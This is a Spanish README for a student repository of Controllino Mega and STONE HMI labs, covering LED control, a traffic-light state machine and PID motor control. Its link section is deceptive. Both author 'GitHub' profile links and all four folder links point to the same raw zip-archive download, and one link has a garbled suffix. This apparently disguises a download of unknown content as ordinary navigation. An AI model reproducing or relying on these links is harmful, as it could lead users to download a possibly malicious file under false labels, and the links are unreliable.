<!-- Banner -->
<div align="center" style="margin-bottom: 10px;">
  <h1 style="margin:0;"> <strong>Control-Digital - Grupo 8</strong></h1>
  <p style="margin:4px 0 10px 0; font-size:14px; color: #555;">
    Prácticas de Control Digital con <strong>Controllino</strong> &amp; <strong>HMI Stone</strong>
  </p>
  <!-- Simple banner-like box -->
  <div style="display:inline-block; padding:10px 18px; border-radius:12px; background: linear-gradient(90deg,#0ea5e9 0%, #7c3aed 100%); color: white;">
    <strong>Automatización • Adquisición de datos • Control PID</strong>
  </div>
</div>

---
  
Repositorio con prácticas de laboratorio orientadas al aprendizaje práctico de **automatización**, **adquisición de datos** e **integración con HMI industriales**.  
Diseñado con fines educativos, pero aplicable a prototipos industriales.


---

## Índice
- [Contenido del Repositorio](#contenido-del-repositorio)  
- [Requisitos del Proyecto](#requisitos-del-proyecto)  
  - [Hardware](#hardware)  
  - [Software](#software)  
- [Arquitectura General](#arquitectura-general)  
- [Autores](#autores)  
- [Enlaces del Repositorio](#enlaces-del-repositorio)
---

## 📘 Contenido del Repositorio

| Proyecto | Descripción |
|------------:|---------------:|
| **Práctica 1 — Manejo de Salidas Digitales (Controllino Mega)** | Control de una matriz de LEDs 3×3 usando salidas del Controllino Mega. |
| **Práctica 2 — Control Digital y Máquina de Estados (FSM)** | **A:** Uso de 3 botones para controlar patrones de LEDs.<br>**B:** FSM que implementa un semáforo simple. |
| **Práctica 3 — Interfaz Gráfica (HMI Stone)** | Control de encendido/apagado de LEDs y ajuste de brillo vía HMI STONE. |
| **Práctica 4 — Adquisición y Control PID de Motor DC** | Lectura de encoder, registro de datos y control PID parametrizable desde la HMI. |

---

## Requisitos del Proyecto

### Hardware
- **Controllino Mega**  
- **HMI STONE** (Serial TTL — 115200 baudios)  
- Motor DC con **encoder (36 ppr)**  
- Fuente de alimentación para motor  
- NI **myDAQ**  


### Software
- **Arduino IDE**  
- Librerías: `Stone_HMI_Define.h`, `Procesar_HMI.h`  
- **NI LabVIEW & MATLAB** (para simulación y obtención de función de transferencia)
---

## Arquitectura General

```text
Controllino Mega
│
├── Sensores
│   ├── Encoder
│   └── Entradas Digitales
│
├── Actuadores
│   ├── LEDs
│   └── Motor DC
│
└── Interfaz HMI
    └── Comunicación Serial (UART)

```

## 👥 Autores

**Eric Cajamarca**  
GitHub: [@elcaja](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)

**Christopher Carchipulla**  
GitHub: [@ChrisCarchipulla](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)

---

## 📁 Enlaces del Repositorio

- **Práctica 4 — Secuencia LEDs:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)

- **Práctica 5 — Secuencia Semáforo:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip%C3%A1foro)

- **Práctica 6 — PWM:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)

- **Práctica 7 — Control PID:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)


